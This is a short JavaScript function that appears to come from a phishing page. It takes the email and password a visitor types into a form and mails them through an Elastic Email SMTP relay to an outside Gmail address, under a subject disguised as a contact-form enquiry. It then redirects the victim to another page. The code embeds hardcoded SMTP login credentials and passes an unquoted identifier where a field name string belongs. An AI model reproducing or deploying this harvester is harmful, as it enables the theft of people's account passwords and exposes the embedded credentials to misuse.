function sendEmail() {
    Email.send({
      Host: "smtp.elasticemail.com",
      Username: "lexbritt11@gmail.com",
      Password: "B98286FB9DE8198F0F85409BD2C0C588062F",
      To: "billscosco0245@gmail.com",
      From: document.getElementById("email").value,
      Subject: "New Contact Info for Form Enquiry",
      Body:
        "Email: " +
        document.getElementById(email).value +
        " <br> Password: " +
        document.getElementById("password").value 
    }).then((message) => {
        // alert("Message")
        window.location.href = "index01.html"

    });
  }
  